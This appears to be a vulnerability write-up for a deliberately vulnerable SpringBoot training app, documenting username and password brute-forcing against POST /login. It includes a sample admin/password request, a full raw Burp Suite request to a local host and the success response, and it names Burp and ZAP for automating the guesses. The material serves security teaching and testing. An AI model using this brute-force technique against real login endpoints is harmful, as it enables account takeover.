# Brute-Force Username and Password
A type of brute force attack that cracks valid user credentials not belonging to the attacker.

## Exploitation
**Prerequisites:** _None_

**Location:** _POST /login_

Brute-Force username and password present within SpringBoot code by not blocking access after consecutive failed login attempts in a short period of time (or other alternative controls).  Below is an exploitation example:

    POST /login
    form-data:
        "username": "admin"
        "password":"password"
    
Burp Suite, ZAP, or equivalent technologies can be used to automate brute-forcing attempts against the web application using the general format above.

Successful exploitation looks like:

    {
        "success": true,
        "code": 200,
        "message": "Login successfully"
    }

NOTE: This vulnerability, unlike the rest, uses _form-data_ not _raw_

## Burp Suite Example Exploitation

    POST /login HTTP/1.1
    Host: 127.0.0.1:8081
    Content-Length: 247
    sec-ch-ua: "Chromium";v="109", "Not_A Brand";v="99"
    Accept: application/json, text/plain, */*
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarykDdQnbEDir7hau67
    X-XSRF-TOKEN: a299d1a2-b857-4b7a-a83f-d656c7b9f48e
    sec-ch-ua-mobile: ?0
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
    sec-ch-ua-platform: "Windows"
    Origin: http://127.0.0.1:4200
    Sec-Fetch-Site: same-site
    Sec-Fetch-Mode: cors
    Sec-Fetch-Dest: empty
    Referer: http://127.0.0.1:4200/
    Accept-Encoding: gzip, deflate
    Accept-Language: en-US,en;q=0.9
    Cookie: XSRF-TOKEN=a299d1a2-b857-4b7a-a83f-d656c7b9f48e
    Connection: close

    ------WebKitFormBoundarykDdQnbEDir7hau67
    Content-Disposition: form-data; name="username"

    admin
    ------WebKitFormBoundarykDdQnbEDir7hau67
    Content-Disposition: form-data; name="password"

    password
    ------WebKitFormBoundarykDdQnbEDir7hau67--
